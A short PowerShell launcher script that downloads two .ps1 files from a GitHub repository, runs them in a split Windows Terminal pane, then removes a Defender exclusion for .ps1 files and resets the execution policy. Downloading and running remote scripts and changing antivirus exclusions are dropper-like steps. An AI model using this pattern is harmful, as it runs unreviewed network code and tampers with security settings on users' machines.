wget raw.githubusercontent.com/KR9SIS/powershellDirWalk/main/print-Header.ps1 -OutFile ('C:\\Users\\' + $env:USERNAME + '\\Downloads\\print-Header.ps1')
wget raw.githubusercontent.com/KR9SIS/powershellDirWalk/main/traverse-Dir.ps1 -OutFile ('C:\\Users\\' + $env:USERNAME + '\\Downloads\\traverse-Dir.ps1')

start-Process wt.exe 'sp -H -p "NoProfile" "Powershell C:\\Users\\" + $env:USERNAME + "\\Downloads\\print-Header.ps1" -nop -noexit -command "Powershell C:\\Users\\" + $env:USERNAME + "\\Downloads\\traverse-Dir.ps1"'

Remove-MpPreference -ExclusionExtension ps1
Set-ExecutionPolicy Restricted -Force
exit
